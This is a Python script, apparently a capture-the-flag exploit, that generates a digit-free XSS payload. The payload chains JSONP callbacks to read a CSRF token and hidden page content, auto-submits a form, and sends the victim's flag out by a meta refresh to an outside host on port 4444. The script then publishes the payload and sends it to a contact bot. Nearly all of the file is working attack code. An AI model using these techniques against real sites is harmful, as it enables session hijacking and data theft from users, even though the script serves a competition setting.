from stage1 import *
import base64, urllib

def num(x):
    if x > 100:
        res = 'Number.call`${atob`%s`}`+Number.call`${atob`%s`}`'% (
            base64.b64encode(str(x-100)).replace('=',''),
            base64.b64encode(str(100)).replace('=',''))
    else:
        res = 'atob`%s`' % base64.b64encode(str(x)).replace('=','')
    print x, res
    assert not any(c in res for c in '0123456789')
    return res.replace('+', '%2b')

def st(s):
    return '${String.fromCharCode.call`%s`}' % ''.join('${%s}'%num(ord(c)) for c in s)

if __name__ == '__main__':
    chall = 'wat.import.getElementById`flagform`.textContent.trim``'
    chall1 = chall+'.split`%2b`.shift``.trim``'
    chall2 = chall+'.split`%2b`.pop``.trim``.substr`${'+num(8)+'}`'
    csrftok = 'wat.import.getElementsByName`csrfmiddlewaretoken`.item``.value'

    post = r'''
    <link id="wat" rel="import" href="/flag2"/>
    <p id="flag"></p>

    <textarea id="stage">
        <form id="flagform"><button type="submit" id="doit">X</button>
    </textarea>

    <script src="/feed?type=jsonp&cb=stage.append`'''+st('<input name="csrfmiddlewaretoken" value="')+'${'+csrftok+'}'+st('"/>')+r'''`"></script>
    <script src="/feed?type=jsonp&cb=stage.append`'''+st('<input name="captcha_answer" value="')+'${Number.call`${'+chall1+'}`%2bNumber.call`${'+chall2+'}`}'+st('"/>')+r'''`"></script>

    <script src="/feed?type=jsonp&cb=stage.append`'''+st('</form>')+'''`"></script>
    <script src="/feed?type=jsonp&cb=document.write`${stage.textContent}`"></script>
    <script src="/static/js/flag.js"></script>

    <script src="/feed?type=jsonp&cb=doit.click"></script>

    <!-- exfil-->

    <textarea id="shit">
    <meta http-equiv="refresh" content="0;URL='http://dtun.de:4444/</textarea>

    <textarea id="rest">'"></textarea>

    <script src="/feed?type=jsonp&cb=shit.append`${flag.innerText}`"></script>
    <script src="/feed?type=jsonp&cb=shit.append`${rest.textContent}`"></script>

    <script src="/feed?type=jsonp&cb=document.write`${shit.textContent}`"></script>
    '''

    with open('payload2.html', 'w') as f:
        f.write(post)
    publish(post)

    payloadpost = list(set(getposts()))[0]
    print '%s/post/%s'%(URL,payloadpost)

    contact(payloadpost)
